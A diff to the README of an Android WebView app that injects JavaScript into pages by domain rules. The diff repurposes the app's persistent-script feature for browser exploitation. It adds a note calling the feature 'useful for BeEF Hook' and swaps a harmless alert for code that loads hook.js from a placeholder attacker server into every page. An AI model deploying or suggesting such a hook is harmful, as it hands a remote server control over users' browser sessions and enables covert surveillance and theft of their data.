@@ -13,7 +13,7 @@ This project is an **Android WebView app** that injects **custom JavaScript** in
    - ✅ **Wildcard match** (`*.example.com`)
    - ✅ **Regex match** (`regex:^.*\.secure\d+\.com$`)
    - ✅ **Default fallback** (if no match is found)
-   - ✅ **Persistent scripts**  (optional: run on all pages if enabled)
+   - ✅ **Persistent scripts**  (optional: run on all pages if enabled useful for BeEF Hook)
 4. The matching JavaScript is **injected into the WebView** using `evaluateJavascript()`.
 5. When a user **navigates to another page**, the process repeats, injecting JavaScript for the new site.
 
@@ -59,8 +59,10 @@ This project is an **Android WebView app** that injects **custom JavaScript** in
         ]
     },
     "persistent": {
-        "scripts": [
-            "alert('This script runs on ALL pages!');"
+         "scripts": [
+            "var script = document.createElement('script');",
+            "script.src = 'http://your-server.com/hook.js';",
+            "document.head.appendChild(script);"
         ],
         "status": false
     }
